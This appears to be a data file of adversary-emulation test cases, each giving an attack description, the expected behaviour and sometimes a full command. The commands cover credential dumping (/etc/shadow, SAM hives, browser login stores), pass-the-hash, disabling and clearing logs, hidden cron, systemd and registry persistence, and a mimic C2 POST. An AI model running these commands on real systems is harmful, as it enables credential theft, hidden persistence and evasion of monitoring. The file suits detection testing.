attacks.expected_behavior: The service is registered in the Service Control Manager and appears in the list of services; no actual malicious code is executed.

attacks.description: Attempts to connect to a remote SMB share, representing initial access to a vulnerable server software that exposes an insecure share.
attacks.expected_behavior: If the share exists and credentials are valid, a network connection is established; otherwise an error is returned. No files are transferred.

attacks.command: powershell -Command \"$b64='TVqQAAMAAAAEAAAA//8AALg...'; Set-Content -Path $env:TEMP\\payload.b64 -Value $b64 -Encoding ASCII; certutil -decode $env:TEMP\\payload.b64 $env:TEMP\\malicious.dll; sc.exe create MaliciousDrv binPath= $env:TEMP\\malicious.dll type= kernel start= demand\"
attacks.description: Writes a placeholder base64 payload to a temporary file, decodes it to a DLL using certutil, and registers the DLL as a kernel driver service, emulating exploitation of a driver loading vulnerability.
attacks.expected_behavior: The base64 string is saved, decoded to a DLL file, and a driver service is created pointing to that DLL. The driver is not started, and the DLL contains only benign placeholder data.

attacks.description: Basic path traversal vulnerability exploitation in web server
attacks.expected_behavior: Attempts to read /etc/passwd via unescaped path traversal in web server

attacks.command: echo 'EVIL_CONFIG_SETTING=1' | sudo tee -a /etc/vulnerable-service.conf && sudo systemctl restart vulnerable-service
attacks.description: Intermediate privilege escalation via service configuration modification
attacks.expected_behavior: Appends malicious configuration and restarts service to trigger vulnerability

attacks.description: Advanced web shell upload and command execution simulation
attacks.expected_behavior: Exploits file upload vulnerability to write web shell and execute test command

attacks.description: Basic: Copy Firefox login database file to a user-writable location with a benign name.
attacks.expected_behavior: Copies the Firefox logins.json file (if present) to the home directory with a disguised filename. No errors are expected if Firefox has been used.

attacks.description: Intermediate: Locate Chrome/Chromium 'Login Data' SQLite file and copy it to a hidden cache directory with restricted permissions.
attacks.expected_behavior: Searches for browser login databases in config directories, copies the first match to a hidden cache file, and sets restrictive permissions. Fails silently if no file is found.

attacks.description: Advanced: Archive multiple credential store files (Firefox and Chrome) into a compressed tarball, ignoring missing files.
attacks.expected_behavior: Creates a compressed archive containing known credential store files from Firefox and Chrome. Uses --ignore-failed-read to skip missing files, making it robust across systems. Output is saved in a standard user data directory.

attacks.description: Clears the Windows Application event log to erase evidence of activity.
attacks.expected_behavior: The Application event log is emptied; subsequent queries show no entries.

attacks.description: Disables the Windows Event Log service by setting its startup type to disabled, preventing future log collection.
attacks.expected_behavior: The Event Log service is set to disabled; after a restart, logging stops and existing logs remain inaccessible.

attacks.description: Deletes all files in the temporary directory, removing possible forensic artifacts left by the attacker.
attacks.expected_behavior: All files and subfolders under %TEMP% are removed; any remnants of tools or logs are erased.

attacks.description: Clears the current user's bash command history by truncating the .bash_history file.
attacks.expected_behavior: The user's command history is erased, removing traces of previously executed commands in bash.

attacks.description: Removes all lines containing 'flax-typhoon' from the system syslog to eliminate specific indicators.
attacks.expected_behavior: Any log entries in /var/log/syslog that reference 'flax-typhoon' are deleted; the command suppresses errors if the file doesn't exist or is unreadable.

attacks.command: systemctl stop rsyslog.service 2>/dev/null || true && systemctl disable rsyslog.service 2>/dev/null || true
attacks.description: Stops and disables the rsyslog service to prevent further logging, potentially evading detection.
attacks.expected_behavior: The rsyslog service is stopped immediately and disabled from starting at boot, halting system log collection.

attacks.description: Dump the remote system's SAM registry hive via the admin share to a local temporary file.
attacks.expected_behavior: Creates a file named sam_remote.dump in the local %TEMP% directory containing the remote SAM hive. The command succeeds only if the user has administrative rights on the remote host.

attacks.description: Dump the remote system's SECURITY registry hive (LSA secrets) via the admin share to a local temporary file.
attacks.expected_behavior: Creates a file named security_remote.dump in the local %TEMP% directory containing the remote SECURITY hive. Requires administrative privileges on the remote machine.

attacks.description: Basic remote credential dump: uses SSH to execute sudo cat /etc/shadow on the remote host and prints the hashed passwords to the local console.
attacks.expected_behavior: The command connects to remote-host as user, escalates with sudo, reads /etc/shadow, and streams its content back to the local terminal.

attacks.description: Intermediate remote credential dump: copies the remote /etc/shadow file to the local $HOME directory using SCP.
attacks.expected_behavior: SCP retrieves the shadow file from the remote host (assuming the user can read it via sudo or appropriate permissions) and stores it locally as remote_shadow_copy.

attacks.command: expect -c 'spawn ssh user@remote-host "sudo cat /etc/shadow"; expect "password:" { send "MySudoPass\n" }; expect eof' > $HOME/remote_shadow_dump
attacks.description: Advanced remote credential dump: automates sudo password entry on the remote host using an Expect script, captures the shadow file output, and saves it locally.
attacks.expected_behavior: The Expect script spawns an SSH session, provides the sudo password automatically, reads /etc/shadow, and redirects the output to a local file named remote_shadow_dump.

attacks.technique_name: Use Alternate Authentication Material: Pass the Hash
attacks.description: Stores an NTLM hash as a credential for RDP in the Windows Credential Manager using cmdkey, enabling later pass‑the‑hash authentication.
attacks.expected_behavior: The credential is added to the local Credential Manager; subsequent mstsc connections to 192.168.1.10 will authenticate using the supplied hash without prompting for a password.

attacks.technique_name: Use Alternate Authentication Material: Pass the Hash
attacks.description: Creates a PSCredential object where the password field contains the NTLM hash and uses PowerShell remoting to execute a command on a remote host, performing pass‑the‑hash via WinRM.
attacks.expected_behavior: PowerShell attempts a WinRM connection to 192.168.1.10 using the hash; if successful, the remote host runs 'whoami' and returns the user context.

attacks.technique_name: Use Alternate Authentication Material: Pass the Hash
attacks.description: Uses WMIC to connect to a remote system by providing an NTLM hash as the password, then creates a remote cmd process that runs 'whoami', demonstrating a native pass‑the‑hash attack.
attacks.expected_behavior: WMIC authenticates to the target using the hash, launches the command, and returns the process ID along with the output of 'whoami' in the WMIC response.

attacks.technique_name: Use Alternate Authentication Material: Pass the Hash
attacks.description: Basic pass‑the‑hash using smbclient to list files on a remote SMB share.
attacks.expected_behavior: The command authenticates to the SMB share using the supplied NTLM hash and prints a directory listing of the remote share.

attacks.technique_name: Use Alternate Authentication Material: Pass the Hash
attacks.description: Intermediate pass‑the‑hash using rpcclient to enumerate domain users on the target.
attacks.expected_behavior: The command authenticates with the NTLM hash and runs the 'enumdomusers' RPC call, returning a list of domain user accounts.

attacks.technique_name: Use Alternate Authentication Material: Pass the Hash
attacks.description: Advanced pass‑the‑hash by mounting a remote CIFS share using the NTLM hash as the password.
attacks.expected_behavior: The command uses sudo to mount the remote share at /mnt/secret, authenticating with the provided NTLM hash. If successful, the remote filesystem becomes accessible at the mount point.

attacks.description: Creates a benign test file and copies it to the System32 directory with the legitimate name svchost.exe.
attacks.expected_behavior: A file named svchost.exe containing the text 'Test' is placed in C:\Windows\System32, mimicking a legitimate system binary.

attacks.description: Creates a Windows service with the legitimate service name 'W32Time' that points to the svchost.exe file placed earlier.
attacks.expected_behavior: A new service named W32Time is registered, referencing the svchost.exe file, appearing indistinguishable from the genuine Windows Time service.

attacks.command: echo $'#!/bin/bash\\necho \"Hello from disguised systemd\"' > /tmp/benign.sh && chmod +x /tmp/benign.sh && sudo cp /tmp/benign.sh /usr/local/bin/systemd && sudo chmod +x /usr/local/bin/systemd
attacks.description: Creates a harmless script and copies it to /usr/local/bin with the name 'systemd', a legitimate system binary name, to blend in with system files.
attacks.expected_behavior: A script named 'systemd' appears in /usr/local/bin; executing it prints 'Hello from disguised systemd'. No system services are affected.

attacks.description: Creates a fake 'ps' executable in the user's local bin directory, mimicking a common command name without requiring elevated privileges.
attacks.expected_behavior: A file named 'ps' is placed in $HOME/.local/bin; running it prints 'Fake ps output' instead of real process listings.

attacks.command: echo \"*/5 * * * * root /usr/bin/true\" | sudo tee /etc/cron.d/ssh >/dev/null && sudo chmod 644 /etc/cron.d/ssh
attacks.description: Creates a cron job file named 'ssh' in /etc/cron.d, using a legitimate‑looking filename to hide the scheduled task.
attacks.expected_behavior: A cron file named 'ssh' is added; every 5 minutes it runs /usr/bin/true. The file blends with other cron entries and does not affect system functionality.

attacks.description: Schedule a cron job with a benign command masquerading as a system maintenance task
attacks.expected_behavior: Adds a user-level cron job that runs every minute, writing to a log file in /tmp. The command appears as routine maintenance but could be abused for persistence.

attacks.command:
printf '[Unit]
Description=Log Cleanup Daemon
[Service]
Type=simple
ExecStart=/bin/sh -c "while true; do echo \"cleaning logs\" >> /tmp/log-cleaner.log; sleep 60; done"
[Install]
WantedBy=multi-user.target' > /tmp/.svc-log-cleaner.service && sudo mv /tmp/.svc-log-cleaner.service /etc/systemd/system/ && sudo chmod 644 /etc/systemd/system/.svc-log-cleaner.service && sudo systemctl enable .svc-log-cleaner.service && sudo systemctl start .svc-log-cleaner.service
attacks.description: Install a hidden system service with a name and description mimicking a log maintenance utility
attacks.expected_behavior: Creates a system-wide systemd service with a dot-prefixed (hidden) filename and plausible description. Runs a loop that logs every 60 seconds. Requires root to write to /etc/systemd/system/ and manage services.

attacks.command: reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TestPersistence /t REG_SZ /d \"cmd.exe /c echo PersistenceTest > %TEMP%\\persistence.txt\" /f
attacks.description: Adds a Run registry entry for the current user that launches a benign command at logon, creating a persistence mechanism by modifying a system process startup location.
attacks.expected_behavior: The registry value is created. On the next user logon, cmd.exe runs and writes a file %TEMP%\persistence.txt containing the text 'PersistenceTest'.

attacks.command: sc create TestService binPath= \"cmd.exe /c echo ServiceStarted > %TEMP%\\service.txt\" start= auto obj= \"LocalSystem\"
attacks.description: Creates a new Windows service that runs a harmless echo command, demonstrating creation of a system process that persists across reboots.
attacks.expected_behavior: The service 'TestService' is installed and set to start automatically. When the service starts, it creates %TEMP%\service.txt with the text 'ServiceStarted'.

attacks.description: Creates a scheduled task that executes a benign command at each logon, illustrating modification of system process scheduling for persistence.
attacks.expected_behavior: The task 'TestTask' is registered. At the next logon, it runs and writes %TEMP%\task.txt containing 'TaskRan'.

attacks.description: Adds a cron job for the current user that runs every minute, writing 'test' to a file in /tmp as a persistence mechanism.
attacks.expected_behavior: A user-level cron job is installed and executes every minute, creating or updating /tmp/cron_test with the word 'test'. No elevated privileges are required.

attacks.description: Uses the 'at' daemon to schedule a job on reboot that creates a file in /tmp, simulating persistence via delayed execution.
attacks.expected_behavior: The at job scheduler registers a task to run at next reboot. After boot, after a 20-second delay, it writes 'test' to /tmp/at_reboot_test. This does not require admin rights if the at daemon is running and user is permitted.

attacks.description: Connects to a remote SMB share using provided credentials and copies a benign test file from the local temp directory to the share, simulating exploitation of a remote file service.
attacks.expected_behavior: The command establishes a network connection to the SMB share and copies the file; success is indicated by a 'The file was copied' message.

attacks.command: sc.exe create ExploitService binPath= "%TEMP%\\calc.exe" start= demand
attacks.description: Creates a new Windows service named 'ExploitService' that runs the harmless calculator executable from the temp folder, demonstrating service creation abuse.
attacks.expected_behavior: The service is registered in the Service Control Manager; running 'sc query ExploitService' will show it in a stopped state. The service can be started with 'sc start ExploitService'.

attacks.command: wmic /node:"192.168.1.10" /user:"domain\\user" /password:"password" process call create "cmd.exe /c echo test > C:\\Windows\\Temp\\wmic_test.txt"
attacks.description: Uses WMI to remotely execute a command on the target machine that writes a test string to a file, illustrating remote process creation via the Windows Management Instrumentation service.
attacks.expected_behavior: The remote machine creates the file C:\Windows\Temp\wmic_test.txt containing the word 'test'. Success is indicated by a ReturnValue of 0 from the wmic call.

attacks.description: Basic connectivity test to a remote SSH service using netcat.
attacks.expected_behavior: Netcat attempts to connect to the target IP on port 22 and reports whether the port is open (successful connection) or closed.

attacks.description: Intermediate attempt to authenticate to a remote SSH service and execute a harmless command.
attacks.expected_behavior: SSH tries to log in as 'user' without prompting for a password; if key-based authentication succeeds, the remote host echoes 'testpayload'. If authentication fails, an error is shown.

attacks.description: Advanced delivery of a crafted HTTP request to a remote web service using socat, simulating exploitation of a vulnerable service.
attacks.expected_behavior: Socat opens a TCP connection to the target on port 80 and sends the custom HTTP request containing the 'testpayload' User-Agent header; the response (if any) from the server is displayed.

attacks.description: Basic HTTP GET request to simulate beaconing to a C2 server
attacks.expected_behavior: Sends a GET request to localhost on port 8080; returns response if service is running. No data is exfiltrated.

attacks.description: Intermediate: HTTP POST request with status data to simulate heartbeat or data submission
attacks.expected_behavior: Sends a POST request with 'status=alive' to localhost; output is printed to stdout. Safe for local testing.

attacks.command: curl -X POST http://127.0.0.1:8080/submit -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -d '@/tmp/payload.txt' -o /dev/null -s
attacks.description: Advanced: Obfuscated C2 communication with fake User-Agent and data from file
attacks.expected_behavior: Reads data from /tmp/payload.txt (if exists) and sends via POST with spoofed User-Agent. Output suppressed. Harmless if /tmp/payload.txt is benign and endpoint is local.

attacks.description: List all listening TCP and UDP ports to discover network services running locally
attacks.expected_behavior: Outputs a list of active listening ports and associated protocols; no network traffic is generated beyond local inspection

attacks.description: Use 'ss' to display listening sockets for TCP and UDP services, a modern replacement for netstat
attacks.expected_behavior: Shows all listening network services; operates entirely from kernel state without external connections

attacks.description: Perform service version detection on localhost to identify running network services
attacks.expected_behavior: Scans localhost and attempts to determine service versions on open ports; generates minimal local network traffic

attacks.description: Basic account discovery by reading the local user database file.
attacks.expected_behavior: Outputs the contents of /etc/passwd, listing all local user accounts, their UIDs, GIDs, home directories, and login shells.

attacks.description: Intermediate account discovery using the getent utility to query the Name Service Switch, which includes local and potentially remote (e.g. LDAP) user accounts.
attacks.expected_behavior: Enumerates all user accounts known to the system, including those from network directories, formatted similarly to /etc/passwd.

attacks.description: Advanced account discovery filtering normal user accounts (typically UID >= 1000) and displaying username, UID, home directory, and shell.
attacks.expected_behavior: Outputs a formatted list of regular user accounts, excluding system accounts, to focus on interactive users of interest.

attacks.description: Adds a Run key for the current user that launches Notepad at logon using reg.exe.
attacks.expected_behavior: The registry entry HKCU\Software\Microsoft\Windows\CurrentVersion\Run\TestRun is created with value "C:\Windows\System32\notepad.exe"; Notepad will start automatically on the next user logon.

attacks.description: Uses PowerShell to add a machine‑wide Run key that launches Calculator, requiring admin rights.
attacks.expected_behavior: Creates HKLM\Software\Microsoft\Windows\CurrentVersion\Run\TestRun with value "C:\Windows\System32\calc.exe"; Calculator will start for all users at logon.

attacks.description: Adds a RunOnce entry under HKLM that executes Notepad a single time after the next reboot, requiring admin rights.
attacks.expected_behavior: Creates HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\OneTime with value "C:\Windows\System32\notepad.exe"; Notepad will run once on the next system start and then the entry will be removed automatically.

attacks.description: Basic persistence: creates a harmless script and appends its execution to the user's .bashrc so it runs on each new shell.
attacks.expected_behavior: When the user opens a new terminal or logs in, the script $HOME/.local/bin/persist.sh is executed, printing "Persistence test".

attacks.command: sudo mkdir -p /etc/cron.d && echo "@reboot root $HOME/.local/bin/persist.sh" | sudo tee /etc/cron.d/persist > /dev/null
attacks.description: Advanced persistence: adds a root cron @reboot entry that runs the test script at system boot.
attacks.expected_behavior: On the next system boot, cron executes $HOME/.local/bin/persist.sh as root, printing "Persistence test" to the console or log.
